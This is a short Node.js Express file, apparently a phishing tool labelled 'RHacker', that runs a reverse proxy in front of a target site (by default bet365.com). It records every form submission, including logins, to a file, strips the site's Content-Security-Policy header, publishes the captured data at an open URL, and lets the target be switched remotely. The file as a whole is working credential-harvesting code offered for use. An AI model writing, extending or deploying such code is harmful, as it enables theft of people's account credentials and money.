const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const cheerio = require('cheerio');

const app = express();
const PORT = process.env.PORT || 3000;
const ALVO_FILE = 'alvo.txt';

function getAlvo(){
  try { return fs.readFileSync(ALVO_FILE,'utf8').trim(); }
  catch { return 'https://www.bet365.com'; }
}
function setAlvo(url){ fs.writeFileSync(ALVO_FILE,url); }

app.use(bodyParser.urlencoded({extended:true}));
app.use(bodyParser.json());

function salvar(d){
  fs.appendFileSync('dados.txt', `[${new Date().toISOString()}] ${JSON.stringify(d)}\n`);
}

app.use('/', createProxyMiddleware({
  target:getAlvo(),
  changeOrigin:true,
  ws:true,
  onProxyReq:(p,req)=>{ if(req.body && Object.keys(req.body).length) salvar(req.body); },
  onProxyRes:(pr,req,res)=>{
    let b=''; pr.on('data',c=>b+=c);
    pr.on('end',()=>{$=cheerio.load(b); pr.headers['content-security-policy']=''; res.set(pr.headers); res.end($.html());});
  }
}));

app.use('/painel', express.static(path.join(__dirname,'public')));
app.get('/dados.txt', (_,r)=>r.sendFile(path.resolve('dados.txt')));
app.post('/setalvo', (req,res)=>{ setAlvo(req.body.url); res.send('OK'); });

app.listen(PORT,()=>console.log(`RHacker on ${PORT}`));
